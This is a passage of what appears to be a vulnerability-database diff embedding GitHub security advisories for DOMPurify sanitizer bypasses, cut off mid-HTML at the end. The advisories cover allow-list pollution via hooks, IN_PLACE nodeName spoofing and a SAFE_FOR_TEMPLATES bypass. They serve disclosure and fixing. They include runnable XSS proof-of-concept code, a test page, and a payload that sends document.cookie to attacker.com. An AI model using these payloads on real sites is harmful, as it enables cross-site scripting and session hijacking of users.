`<svg><script>__<\/script></svg>` | **YES** |\n| 4b after `clearConfig()` | same | `<a onclick=\"__\">x</a>` | **YES** |\n| 5 explicit restrictive `cfg.ALLOWED_TAGS=['svg']` | same | `<svg></svg>` | no (cloned set) |\n| 6 back to no cfg | same | `<svg><script>__<\/script></svg>` | **YES** |\n| 6b back to no cfg | same | `<a onclick=\"__\">x</a>` | **YES** |\n| 7 fresh `DOMPurify(window)` instance | same | `<svg></svg>` | no |\n| 7b fresh instance | `<a onclick=__>x</a>` | `<a>x</a>` | no |\n\n## Impact\n\n### Direct\n\nAny application using `DOMPurify` that has any registered hook with the pattern `data.allowedTags[...] = true` or `data.allowedAttributes[...] = true`. The hook need not be designed to be permissive \u2014 it might be intended to *temporarily* allow a custom tag for one specific element shape. After the hook has executed even once, every subsequent default-config sanitize call carries the widened defaults, including:\n\n- attacker content rendered via separate code paths (e.g., the same library serving a comments section and a profile bio, where the bio uses the hook and the comments use plain `DOMPurify.sanitize(text)`)\n- third-party libraries that call `DOMPurify.sanitize` on the same instance\n\nThe bypass survives `DOMPurify.removeAllHooks()` and `DOMPurify.clearConfig()` \u2014 the obvious \"reset\" calls a dev would reach for. Detection requires reading the `DEFAULT_ALLOWED_TAGS` / `DEFAULT_ALLOWED_ATTR` sets directly, which are not part of the public API.\n\n### Indirect / second-order\n\n- **Editor / preview libraries** that compose with DOMPurify \u2014 if any consumer registers a hook that mutates `data.allowedTags`, every other consumer's sanitize calls inherit the widening.\n- **Test suites** that exercise multiple sanitize configurations \u2014 once a test's hook pollutes the defaults, later tests that assume default behavior may pass with widened defaults and miss real regressions.\n- **Long-running servers** (SSR, edge functions) that reuse a single DOMPurify instance \u2014 pollution accumulates over the process lifetime.\n\n### Why the existing maintainer defense for `ADD_TAGS` doesn't catch this\n\n`src/purify.ts:696-700` already documents awareness:\n\n```ts\n} else if (arrayIsArray(cfg.ADD_TAGS)) {\n  if (ALLOWED_TAGS === DEFAULT_ALLOWED_TAGS) {\n    ALLOWED_TAGS = clone(ALLOWED_TAGS);\n  }\n  addToSet(ALLOWED_TAGS, cfg.ADD_TAGS, transformCaseFunc);\n}\n```\n\nThe clone-before-mutate pattern is exactly what's needed at the hook callsites (`:1206-1209` and `:1494-1500`) but was not extended there. The new entries this report's bypass adds to the defaults survive the same way `ADD_TAGS` array entries would have survived before that fix landed.\n\n## Suggested fix\n\nThree minimal-impact options, in order of preference:\n\n1. **Hand the hook a defensive copy** (most surgical):\n\n   ```ts\n   _executeHooks(hooks.uponSanitizeElement, currentNode, {\n     tagName,\n     allowedTags: { ...ALLOWED_TAGS },     // shallow copy; mutations stay scoped\n   });\n   ```\n\n   Doc note: \"`data.allowedTags` is a snapshot; to widen the live set, use `cfg.ADD_TAGS` or set the value to true in the snapshot and check the snapshot from a subsequent attribute hook.\" Hooks that read it for inspection still work; hooks that intended cross-call mutation must be rewritten to use a proper config path (which is the correct API anyway).\n\n2. **Clone-on-write inside the hook path**, mirroring the existing `ADD_TAGS` defense at `:696-700`: detect that `ALLOWED_TAGS === DEFAULT_ALLOWED_TAGS` after the hook returns, and if so, replace it with a clone for subsequent processing. This preserves the live-mutation semantics for in-call effects while preventing cross-call leakage.\n\n3. **Lazy-clone `ALLOWED_TAGS`/`ALLOWED_ATTR` from defaults on first mutation**: install a Proxy or accessor that triggers a clone before mutation. Largest surface area, but bulletproof.\n\nOption (1) is the cleanest API contract: hook event objects should be event-local, never references to library-internal state.",
+                info: [
+                  "https://github.com/cure53/DOMPurify/security/advisories/GHSA-76mc-f452-cxcm"
+                ]
+              },
+              {
+                atOrAbove: "0",
+                below: "3.4.7",
+                severity: "medium",
+                cwe: [
+                  "CWE-79"
+                ],
+                identifiers: {
+                  summary: "DOMPurify IN_PLACE Sanitization Bypass via Attached Shadow Root Inside <template>.content",
+                  githubID: "GHSA-rp9w-3fw7-7cwq",
+                  CVE: [
+                    "CVE-2026-49978"
+                  ]
+                },
+                details: "If the HTML you give it contains a <template> element, and inside that template there's an element with a shadow DOM attached to it, DOMPurify quietly skips over the shadow contents. Whatever the attacker put in there - an image with an onerror handler, a link with a javascript: URL, even a full script - survives untouched. The moment the application uses that template the way templates are meant to be used (cloning it and inserting the result into the page), the malicious payload comes along and runs as if it had never been sanitized. From there an attacker gets everything XSS normally gets them: session cookies, stored tokens, the ability to act as the user, and the ability to leave persistent payloads behind for the next person who visits.\n\n[advisory.pdf](https://github.com/user-attachments/files/28275600/advisory.pdf)\n\n[poc.html](https://github.com/user-attachments/files/28275708/poc.html)",
+                info: [
+                  "https://github.com/cure53/DOMPurify/security/advisories/GHSA-rp9w-3fw7-7cwq"
+                ]
+              },
+              {
+                atOrAbove: "0",
+                below: "3.4.7",
+                severity: "low",
+                cwe: [
+                  "CWE-79"
+                ],
+                identifiers: {
+                  summary: "DOMPurify: `IN_PLACE` mode trusts attacker-controlled `nodeName` on live non-form nodes, allowing script retention and XSS via attacker-supplied DOM objects",
+                  githubID: "GHSA-x4vx-rjvf-j5p4",
+                  CVE: [
+                    "CVE-2026-65901"
+                  ]
+                },
+                details: "## Summary\n\nWhen `DOMPurify.sanitize(root, { IN_PLACE: true })` is called on an attacker-supplied live DOM node, `DOMPurify` still trusts `currentNode.nodeName` for non-`form` nodes in the main `_sanitizeElements` pipeline. A real `<script>` child node whose observable `nodeName` is attacker-controlled can therefore be misclassified as an allowed element and retained. When the sanitized tree is inserted into a live document, the script executes.\n\nThis affects current `3.4.6`. The recent `IN_PLACE` hardening work covers clobbered `form` handling and foreign-realm shadow/template traversal, but does not harden the main per-node element decision for hostile non-`form` live nodes.\n\n## Affected\n\n- DOMPurify `3.4.6`\n- Any caller that does `DOMPurify.sanitize(node, { IN_PLACE: true })` on attacker-supplied live DOM nodes\n- Verified attacker-controlled node sources:\n  - same-origin `iframe` \u2192 live node passed by reference\n  - same-origin `window.open()` popup \u2192 live node passed by reference\n  - same-origin foreign node adopted into the host document via `document.adoptNode(node)` and then sanitized in-place\n\nNot affected:\n\n- String-input `DOMPurify.sanitize(dirtyString)`\n\n## Vulnerability details\n\n### Code paths\n\n[A] \u2014 `_sanitizeElements` uses the instance-visible `nodeName` for the allow/forbid decision:\n\n```ts\nconst _sanitizeElements = function (currentNode: any): boolean {\n  ...\n  if (_isClobbered(currentNode)) {\n    _forceRemove(currentNode);\n    return true;\n  }\n\n  const tagName = transformCaseFunc(currentNode.nodeName);\n  ...\n  if (\n    FORBID_TAGS[tagName] ||\n    (!(...) && !ALLOWED_TAGS[tagName])\n  ) {\n    ...\n    _forceRemove(currentNode);\n    return true;\n  }\n  ...\n};\n```\n\nFor non-`form` nodes, `_isClobbered(currentNode)` returns `false` early. The subsequent element decision therefore trusts `currentNode.nodeName` directly.\n\n[B] \u2014 `_isClobbered` is `form`-specific:\n\n```ts\nconst _isClobbered = function (element: Element): boolean {\n  const realTagName = getNodeName ? getNodeName(element) : null;\n  if (typeof realTagName !== 'string') {\n    return false;\n  }\n\n  if (transformCaseFunc(realTagName) !== 'form') {\n    return false;\n  }\n\n  return (...);\n};\n```\n\nThe hardening is intentionally scoped to `form`. Non-`form` nodes are not checked for divergence between the instance-visible property view and the trusted prototype getter view.\n\n### Why the bypass works\n\nThe attack does **not** depend on string HTML parsing. It depends on a hostile live DOM object crossing a trust boundary into `DOMPurify`'s `IN_PLACE` pipeline.\n\nIf the attacker controls a same-origin subcontext (`iframe` or popup), they can prepare a real DOM subtree there and then pass the live node object by reference to a host page that trusts `DOMPurify.sanitize(node, { IN_PLACE: true })` as its final sanitization step.\n\nFor the verified primitive below:\n\n- the real child node is `<script>`\n- its script text is attacker-controlled\n- the observable `nodeName` is attacker-controlled and made to appear as `\"DIV\"`\n- `_sanitizeElements` therefore classifies the real `<script>` child as an allowed element\n- the real `<script>` survives in the sanitized tree and executes on insertion\n\nThis primitive survives:\n\n- direct reference passing\n- `document.adoptNode(node)` followed by `IN_PLACE`\n\nIt does **not** survive:\n\n- `importNode`\n- `cloneNode`\n\nbecause those paths materialize a fresh node and discard the hostile object semantics.\n\n## Proof of concept\n\n### (1) Minimal \u2014 runnable in a single browser context\n\n```html\n<!doctype html>\n<html><body>\n<script src=\"dist/purify.js\"><\/script>\n<script>\n  const foreign = window.open('about:blank', '_blank', 'noopener=no');\n\n  const host = foreign.document.createElement('div');\n  const script = foreign.document.createElement('script');\n  script.textContent = 'window.__pwned = 1';\n  Object.defineProperty(script, 'nodeName', {\n    value: 'DIV',\n    configurable: true,\n  });\n  host.appendChild(script);\n\n  DOMPurify.sanitize(host, { IN_PLACE: true });\n\n  console.log('output:', host.outerHTML);\n  // <div><script>window.__pwned = 1<\/script></div>\n\n  window.__pwned = 0;\n  document.body.appendChild(host);\n  console.log('handler fired:', window.__pwned === 1); // true\n<\/script>\n</body></html>\n```\n\n### (2) End-to-end \u2014 Playwright\n\n```js\nconst { chromium } = require('playwright');\nconst path = require('path');\n\n(async () => {\n  const browser = await chromium.launch();\n  const page = await browser.newPage();\n  await page.goto('about:blank');\n  await page.addScriptTag({ path: path.resolve('dist/purify.js') });\n\n  const result = await page.evaluate(async () => {\n    window.__hits = [];\n\n    const foreign = window.open('about:blank', '_blank', 'noopener=no');\n    const host = foreign.document.createElement('div');\n    const script = foreign.document.createElement('script');\n    script.textContent = 'top.__hits.push(\"script-fired\")';\n    Object.defineProperty(script, 'nodeName', {\n      value: 'DIV',\n      configurable: true,\n    });\n    host.appendChild(script);\n\n    DOMPurify.sanitize(host, { IN_PLACE: true });\n    document.body.appendChild(host);\n\n    return {\n      version: DOMPurify.version,\n      output: host.outerHTML,\n      fired: window.__hits.includes('script-fired'),\n    };\n  });\n\n  console.log(result);\n  await browser.close();\n})();\n```\n\nObserved:\n\n- Chromium / Firefox / WebKit\n\n```js\n{\n  version: '3.4.6',\n  output: '<div><script>top.__hits.push(\"script-fired\")<\/script></div>',\n  fired: true\n}\n```\n\n## Impact\n\n### Direct\n\nXSS via retained real `<script>` nodes inside attacker-supplied live DOM objects.\n\nAny consumer that uses `DOMPurify.sanitize(node, { IN_PLACE: true })` as a security boundary for live DOM objects supplied by a lower-trust same-origin subcontext is vulnerable.\n\nThe typical pattern is:\n\n```js\n// attacker-controlled same-origin subcontext prepares a live node\nconst foreignNode = attackerFrame.contentWindow.makeNode();\n\n// host treats DOMPurify as the last security gate\nDOMPurify.sanitize(foreignNode, { IN_PLACE: true });\ncontainer.appendChild(foreignNode);\n```\n\nIf `foreignNode` is a hostile live DOM object whose real child is `<script>` but whose observable `nodeName` is attacker-controlled, the sanitized output still contains the real script node when re-inserted into the live document.\n\n### Indirect / second-order\n\n- Applications that accept same-origin plugin / extension / widget DOM and rely on `IN_PLACE` as the final sanitization step\n- Editor or design-tool architectures where lower-trust subcontexts submit live DOM subtrees to a higher-trust host for in-place sanitization\n\n## Suggested fix\n\nTwo minimal-risk options:\n\n1. Stop trusting instance-visible `nodeName` for the element decision in `IN_PLACE`.\n\nUse the cached prototype getter (or another trusted realm-safe primitive) for the allow/forbid decision, just as the recent hardening already does for selected root and shadow-root checks.\n\nIn other words, the main pipeline should not do:\n\n```ts\nconst tagName = transformCaseFunc(currentNode.nodeName);\n```\n\non hostile live objects.\n\n2. Generalize hostile-node detection beyond `form`.\n\nThe current `_isClobbered()` logic is `form`-specific. A more defensive approach would reject or strictly sanitize any `IN_PLACE` node whose instance-visible critical properties diverge from the trusted prototype getter view, at least for:\n\n- `nodeName`\n- `attributes`\n- `childNodes`\n\nEither approach would close the verified primitive above.",
+                info: [
+                  "https://github.com/cure53/DOMPurify/security/advisories/GHSA-x4vx-rjvf-j5p4"
+                ]
+              },
+              {
+                atOrAbove: "3.0.0",
+                below: "3.4.8",
+                severity: "low",
+                cwe: [
+                  "CWE-79"
+                ],
+                identifiers: {
+                  summary: "DOMPurify: SAFE_FOR_TEMPLATES bypass - template expressions survive sanitization inside <template> content when using DOM output modes",
+                  githubID: "GHSA-gvmj-g25r-r7wr",
+                  CVE: [
+                    "CVE-2026-65900"
+                  ]
+                },
+                details: "## Summary\n\nWhen DOMPurify is configured with both `SAFE_FOR_TEMPLATES: true` and `RETURN_DOM: true` (or `IN_PLACE: true`), an attacker can inject template expressions, such as `${evil}`, `{{evil}}`, or `<%evil%>`, that survive the sanitization pass inside `<template>` element content. This bypasses the explicit purpose of `SAFE_FOR_TEMPLATES`, which is to prevent template engine evaluation of user-supplied content.\n\n> **Note:** The string output path is **not** affected. Only the DOM return paths (`RETURN_DOM: true`, `RETURN_DOM_FRAGMENT: true`, `IN_PLACE: true`) are vulnerable.\n\n---\n\n## Description\n\n### Background\n\n`SAFE_FOR_TEMPLATES` is designed to strip `{{ }}`, `${ }`, and `<% %>` expressions from sanitized output so that downstream template engines do not evaluate user-controlled content. The feature operates through two mechanisms:\n\n1. **Per-node scrubbing** (`_sanitizeElements`, `src/purify.ts:1403`), scrubs individual text nodes during the main sanitization walk.\n2. **Final normalization pass** (`_scrubTemplateExpressions`, `src/purify.ts:1115`), calls `node.normalize()` to merge adjacent text nodes, then walks the merged nodes and strips any expressions that only appeared after merging.\n\n### The Gap\n\n`_scrubTemplateExpressions` uses a standard `NodeIterator` rooted at the output body:\n\n```ts\n// src/purify.ts:1117\nconst walker = createNodeIterator.call(\n  node.ownerDocument || node,\n  node,\n  NodeFilter.SHOW_TEXT | NodeFilter.SHOW_COMMENT | ...,\n  null\n);\n```\n\nPer the DOM specification, a `NodeIterator` does **not** descend into `<template>.content`. The template element's content is a separate `DocumentFragment` that lives outside the normal child-node tree. For the same reason, `node.normalize()` (called on line 1116) also **does not** normalize text nodes inside `<template>.content`.\n\nThis means the final normalization and scrub pass, the only pass that catches expressions formed *by merging split text nodes*, never runs on `<template>` content.\n\n### How Split Text Nodes Are Created\n\nWhen DOMPurify removes a disallowed element with `KEEP_CONTENT: true` (the default), it moves the element's text children into the parent node. This is the standard code path at `src/purify.ts:1361\u20131373`:\n\n```ts\nif (KEEP_CONTENT && !FORBID_CONTENTS[tagName]) {\n  const parentNode = getParentNode(currentNode);\n  const childNodes = getChildNodes(currentNode);\n  if (childNodes && parentNode) {\n    for (let i = childCount - 1; i >= 0; --i) {\n      const childClone = cloneNode(childNodes[i], true);\n      parentNode.insertBefore(childClone, getNextSibling(currentNode));\n    }\n  }\n}\n```\n\nIf the removed elements were adjacent siblings inside `<template>` content, their extracted text nodes end up as **adjacent text nodes** in the template content fragment. Each individual text node is scrubbed by `_sanitizeElements`, but since `$` and `{evil}` do not match any expression regex on their own, neither is modified.\n\nThe code comment at `src/purify.ts:1100` explicitly acknowledges the threat class:\n\n> *\"which only form after text-node normalization (e.g. fragments split across stripped elements) cannot survive into a template-evaluating framework.\"*\n\nThe implementation guards against this on the main body, but the guard is **not** applied to `<template>` content.\n\n---\n\n## Proof of Concept\n\n### Why the Split Works\n\nThe bypass relies on splitting `${...}` across two adjacent custom elements so that neither fragment matches any DOMPurify regex on its own:\n\n| Fragment | Against `TMPLIT_EXPR` `/\\${[\\w\\W]*/g` | Against `MUSTACHE_EXPR` `/{{[\\w\\W]*\\|^[\\w\\W]*}}/g` | Result |\n|---|---|---|---|\n| `$` | Requires `${` - no `{` follows | No `{{` or `}}` | **Survives** |\n| `{alert(document.domain)}` | Requires leading `$` - absent | No `{{`, ends with single `}` not `}}` | **Survives** |\n| `${alert(document.domain)}` | Full match - would be stripped | - | Stripped if seen whole |\n\nDOMPurify only sees each fragment in isolation. It never merges them before checking, so the expression is never detected.\n\n---\n\n### PoC 1 - XSS via `alert()` (baseline confirmation)\n\n```javascript\n// Attacker input - splits \"${alert(document.domain)}\" across two custom elements.\n// Custom elements are not in DOMPurify's default ALLOWED_TAGS and are removed,\n// but their text content is kept (KEEP_CONTENT: true is the default).\nconst dirty =\n  '<template>' +\n    '<x-split-1>$</x-split-1>' +\n    '<x-split-2>{alert(document.domain)}</x-split-2>' +\n  '</template>';\n\n// Developer sanitizes with SAFE_FOR_TEMPLATES, trusting it strips ${...}\nconst sanitized = DOMPurify.sanitize(dirty, {\n  RETURN_DOM: true,\n  SAFE_FOR_TEMPLATES: true,\n});\n\n// Inspect what survived inside the <template>\nconst tmpl = sanitized.querySelector('template');\nconsole.log([...tmpl.content.childNodes].map(n => n.nodeValue));\n// [\"$\", \"{alert(document.domain)}\"]  <-- two separate text nodes, both \"clean\"\n\n// Frameworks (lit-html, Angular, custom renderers) routinely call normalize()\n// before reading template content. This merges the adjacent nodes:\ntmpl.content.normalize();\nconsole.log(tmpl.content.textContent);\n// \"${alert(document.domain)}\"  <-- fully formed expression, past the sanitizer\n\n// Any template-literal evaluator now fires XSS:\nconst expr = tmpl.content.textContent;\nnew Function(`return \\`${expr}\\``)();\n// !! alert(document.domain) executes !!\n```\n\n---\n\n### PoC 2 - Session Hijacking via cookie exfiltration\n\n```javascript\n// Splits \"${document.location='//attacker.com/?c='+document.cookie}\"\n// \"{document.location=...}\" ends with a single \"}\" \u2014 does NOT match\n// MUSTACHE_EXPR's \"^[\\w\\W]*}}\" (requires double \"}}\"), so it survives.\nconst dirty =\n  '<template>' +\n    '<x-a>$</x-a>' +\n    '<x-b>{document.location=\"//attacker.com/?c=\"+document.cookie}</x-b>' +\n  '</template>';\n\nconst sanitized = DOMPurify.sanitize(dirty, {\n  RETURN_DOM: true,\n  SAFE_FOR_TEMPLATES: true,\n});\n\nconst tmpl = sanitized.querySelector('template');\ntmpl.content.normalize();\n\nconsole.log(tmpl.content.textContent);\n// \"${document.location=\"//attacker.com/?c=\"+document.cookie}\"\n\n// Template engine evaluates it - victim's browser makes the request:\nnew Function(`return \\`${tmpl.content.textContent}\\``)();\n// !! Redirects victim to attacker.com with their full cookie string !!\n// e.g. https://attacker.com/?c=session=abc123;auth_token=xyz789\n```\n\n---\n\n### PoC 3 - End-to-end: realistic application context\n\nThis shows the full path in an application that uses DOMPurify to sanitize user-submitted rich text before rendering it with a custom template engine:\n\n```html\n<!-- index.html - the vulnerable application -->\n<div id=\"output\"></div>\n<script type=\"module\">\n  import DOMPurify from './dist/purify.es.mjs';\n\n  // Simulates fetching and rendering user-submitted comment\n  async function renderComment(userHtml) {\n    // Developer correctly uses SAFE_FOR_TEMPLATES to protect the template engine\n    const dom = DOMPurify.sanitize(userHtml, {\n      RETURN_DOM: true,\n      SAFE_FOR_TEMPLATES: true,\n    });\n\n    // Application iterates <template> elements and evaluates their content\n    // (common pattern in component-based frameworks)\n    dom.querySelectorAll('template').forEach(tmpl => {\n      tmpl.content.normalize(); // standard DOM housekeeping\n      const content = tmpl.content.textContent;\n\n      // Application uses template literals to interpolate user content into UI\n      const rendered = new Function('user', `return \\`${content}\\``)({ name: 'World' });\n      document.getElementById('output').innerHTML += rendered;\n    });\n  }\n\n  // Attacker-supplied comment content\n  const attackerComment =\n    '<template>' +\n      '<x-a>$</x-a>' +\n      '<x-b>{alert(\"XSS: \" + document.cookie)}</x-b>' +\n    '</template>';\n\n  // Developer believes SAFE_FOR_TEMPLATES makes this safe \u2014 it does not for RETURN_DOM\n  renderComment(attackerComment);\n  // !! XSS fires, alert pops with session cookies !!\n<\/script>\n```\n\n**Observed output:** `alert(\"XSS: \" + document.cookie)` executes in the victim's browser context, leaking session tokens to the attacker.\n\n---\n\n### PoC 4 - `IN_PLACE` mode (DOM input path)\n\n```javascript\n// Applicable when the application sanitizes DOM nodes directly\n// (e.g., content loaded into an iframe or received from a WebSocket)\n\nconst container = document.createElement('div');\nconst tmpl = document.createElement('template');\n\n// Adjacent text nodes - these would never appear in HTML-parsed content,\n// but CAN appear in programmatically constructed DOM or WebSocket messages\n// that are deserialised into DOM nodes before sanitisation.\ntmpl.content.appendChild(document.createTextNode('$'));\ntmpl.content.appendChild(document.createTextNode('{alert(document.domain)}'));\ncontainer.appendChild(tmpl);\n\n// Sanitize in-place with SAFE_FOR_TEMPLATES - expected to strip all ${...}\nDOMPurify.sanitize(container, { IN_PLACE: true, SAFE_FOR_TEMPLATES: true });\n\n// Neither text node was modified - each passed the regex check individually\ncontainer.querySelector('template').content.normalize();\nconsole.log(container.querySelector('template').content.textContent);\n// \"${alert(document.domain)}\"  <-- survived in-place sanitization\n\nnew Function(`return \\`${container.querySelector('template').content.textContent}\\``)();\n// !! XSS fires !!\n```\n\nHTML File for testing\n```HTML\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\" />\n  <title>DOMPurify SAFE_FOR_TEMPLATES Bypass - PoC</title>\n  <script src=\"dist/purify.js\"><\/script>\n  <style>\n    * { box-sizing: border-box; margin: 0; padding: 0; }\n    body {\n      font-family: 'Segoe UI', system-ui, sans-serif;\n      background: #0d1117;\n      color: #e6edf3;\n      padding: 32px;\n    }\n    h1 { font-size: 1.4rem; color: #f85149; margin-bottom: 6px; }\n    .subtitle { color: #8b949e; font-size: 0.9rem; margin-bottom: 32px; }\n    .card {\n      background: #161b22;\n      border: 1px solid #30363d;\n      border-radius: 8px;\n      margin-bottom: 24px;\n      overflow: hidden;\n    }\n    .card-header {\n      display: flex;\n      align-items: center;\n      gap: 10px;\n      padding: 14px 20px;\n      border-bottom: 1px solid #30363d;\n      background: #1c2128;\n    }\n    .badge {\n      font-size: 0.72rem;\n      font-weight: 700;\n      padding: 2px 8px;\n      border-radius: 4px;\n      text-transform: uppercase;\n      letter-spacing: 0.05em;\n    }\n    .badge-run    { background: #1f6feb; color: #fff; }\n    .badge-pass   { background: #238636; color: #fff; }\n    .badge-fail   { background: #da3633; color: #fff; }\n    .badge-warn   { background: #9e6a03; color: #fff; }\n    .card-title   { font-size: 0.95rem; font-weight: 600; }\n    .card-body    { padding: 20px; }\n    label         { font-size: 0.78rem; color: #8b949e; display: block; margin-bottom: 6px; }\n    pre {\n      background: #0d1117;\n      border: 1px solid #30363d;\n      border-radius: 6px;\n      padding: 14px;\n      font-size: 0.82rem;\n      line-height: 1.6;\n      overflow-x: auto;\n      margin-bottom: 14px;\n      white-space: pre-wrap;\n      word-break: break-all;\n    }\n    pre.result    { border-color: #238636; background: #0a1a0f; }\n    pre.escaped   { border-color: #da3633; background: #1a0a0a; }\n    pre.highlight { border-color: #f85149; color: #f85149; font-weight: bold; }\n    .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }\n    @media (max-width: 700px) { .grid { grid-template-columns: 1fr; } }\n    .arrow {\n      text-align: center;\n      font-size: 1.4rem;\n      color: #8b949e;\n      margin: 4px 0;\n    }\n    .xss-banner {\n      display: none;\n      background: #da3633;\n      color: #fff;\n      text-align: center;\n      padding: 16px;\n      font-size: 1.1rem;\n      font-weight: 700;\n      border-radius: 6px;\n      margin-bottom: 24px;\n      letter-spacing: 0.03em;\n    }\n    button {\n      background: #238636;\n      color: #fff;\n      border: none;\n      padding: 10px 22px;\n      border-radius: 6px;\n      font-size: 0.9rem;\n      font-weight: 600;\n      cursor: pointer;\n      margin-right: 10px;\n      margin-bottom: 8px;\n    }\n    button:hover { background: #2ea043; }\n    button.danger { background: #da3633; }\n    button.danger:hover { background: #f85149; }\n    .note {\n      background: #161b22;\n      border-left: 3px solid #9e6a03;\n      padding: 12px 16px;\n      font-size: 0.82rem;\n      color: #e3b341;\n      border-radius: 0 6px 6px 0;\n      margin-top: 14px;\n    }\n    #log {\n      background: #0d1117;\n      border: 1px solid #30363d;\n      border-radius: 6px;\n      padding: 14px;\n      font-size: 0.8rem;\n      font-family: monospace;\n      min-height: 60px;\n      max-height: 300px;\n      overflow-y: auto;\n      line-height: 1.8;\n    }\n    .log-ok   { color: #3fb950; }\n    .log-fail { color: #f85149; }\n    .log-info { color: #8b949e; }\n    .log-warn { color: #e3b341; }\n  </style>\n</head>\n<body>\n\n  <h1>\u{1F534} DOMPurify 3.4.7 - SAFE_FOR_TEMPLATES Bypass</h1>\n  <p class=\"subtitle\">\n    CVE candidate \xB7 Template expression injection via &lt;template&gt; content \xB7\n    Affects: <code>RETURN_DOM + SAFE_FOR_TEMPLATES</code> and <code>IN_PLACE + SAFE_FOR_TEMPLATES</code>\n  </p>\n\n  <div id=\"xss-banner\" class=\"xss-banner\">\n    \u26A0\uFE0F XSS CONFIRMED - Expression executed in this page's context\n  </div>\n\n  <!-- \u2500\u2500 Controls \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 -->\n  <div class=\"card\">\n    <div class=\"card-header\">\n      <span class=\"badge badge-run\">Controls</span>\n      <span class=\"card-title\">Run individual test cases</span>\n    </div>\n    <div class=\"card-body\">\n      <button onclick=\"runAll()\">\u25B6 Run all tests</button>\n      <button onclick=\"runPoC1()\">PoC 1 - alert()</button>\n      <button onclick=\"runPoC2()\">PoC 2 - cookie exfil</button>\n      <button onclick=\"runPoC3()\">PoC 3 - IN_PLACE</button>\n      <button onclick=\"runControl()\">Control - string output (should block)</button>\n      <div class=\"note\">\n        PoC 1 uses <code>confirm()</code> instead of <code>alert()</code> so the page\n        doesn't need a dismiss click to continue. Watch the red banner at the top.\n      </div>\n    </div>\n  </div>\n\n  <!-- \u2500\u2500 PoC 1 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 -->\n  <div class=\"card\" id=\"card-poc1\">\n    <div class=\"card-header\">\n      <span class=\"badge badge-run\" id=\"badge-poc1\">PENDING</span>\n      <span class=\"card-title\">PoC 1 - XSS via confirm() \xB7 RETURN_DOM mode</span>\n    </div>\n    <div class=\"card-body\">\n      <div class=\"grid\">\n        <div>\n          <label>ATTACKER INPUT - splits <code>${\"{confirm(...)}\"}</code> across two custom elements</label>\n          <pre id=\"input-poc1\"></pre>\n        </div>\n        <div>\n          <label>AFTER DOMPurify.sanitize() - what survived in template.content</label>\n          <pre class=\"result\" id=\"nodes-poc1\"></pre>\n        </div>\n      </div>\n      <div class=\"arrow\">\u2193 template.content.normalize() \u2193</div>\n      <label>MERGED TEXT NODE - fully formed expression after normalization</label>\n      <pre class=\"highlight\" id=\"merged-poc1\"></pre>\n      <label>EXECUTION RESULT</label>\n      <pre id=\"exec-poc1\">Not run yet</pre>\n    </div>\n  </div>\n\n  <!-- \u2500\u2500 PoC 2 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 -->\n  <div class=\"card\" id=\"card-poc2\">\n    <div class=\"card-header\">\n      <span class=\"badge badge-run\" id=\"badge-poc2\">PENDING</span>\n      <span class=\"card-title\">PoC 2 - Cookie exfiltration \xB7 RETURN_DOM mode</span>\n    </div>\n    <div class=\"card-body\">\n      <div class=\"grid\">\n        <div>\n          <label>ATTACKER INPUT - exfil payload split across custom elements</label>\n          <pre id=\"input-poc2\"></pre>\n        </div>\n        <div>\n          <label>INDIVIDUAL TEXT NODES after sanitization (each \"clean\")</label>\n          <pre class=\"result\" id=\"nodes-poc2\"></pre>\n        </div>\n      </div>\n      <div class=\"arrow\">\u2193 template.content.normalize() \u2193</div>\n      <label>MERGED EXPRESSION - what a template engine would evaluate</label>\n      <pre class=\"highlight\" id=\"merged-poc2\"></pre>\n      <label>SIMULATED EXECUTION (fetch URL that would be called)</label>\n      <pre id=\"exec-poc2\">Not run yet</pre>\n      <div class=\"note\">\n        Real execution would redirect the victim to\n        <code>attacker.com</code> carrying the session cookie.\n        This PoC constructs the URL without actually sending it.\n      </div>\n    </div>\n  </div>\n\n  <!-- \u2500\u2500 PoC 3 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 -->\n  <div class=\"card\" id=\"card-poc3\">\n    <div class=\"card-header\">\n      <span class=\"badge badge-run\" id=\"badge-poc3\">PENDING</span>\n      <span class=\"card-title\">PoC 3 - XSS \xB7 IN_PLACE mode (DOM node input)</span>\n    </div>\n    <div class=\"card-body\">\n      <div class=\"grid\">\n        <div>\n          <label>ATTACKER PROVIDES - a DOM node with programmatically split text nodes</label>\n          <pre id=\"input-poc3\"></pre>\n        </div>\n        <div>\n          <label>AFTER IN_PLACE sanitization - text nodes unchanged</label>\n          <pre class=\"result\" id=\"nodes-poc3\"></pre>\n        </div>\n      </div>\n      <div class=\"arrow\">\u2193 template.content.normalize() \u2193</div>\n      <label>MERGED EXPRESSION</label>\n      <pre class=\"highlight\" id=\"merged-poc3\"></pre>\n      <label>EXECUTION RESULT</label>\n      <pre id=\"exec-poc3\">Not run yet</pre>\n    </div>\n  </div>\n\n  <!-- \u2500\u2500 Control 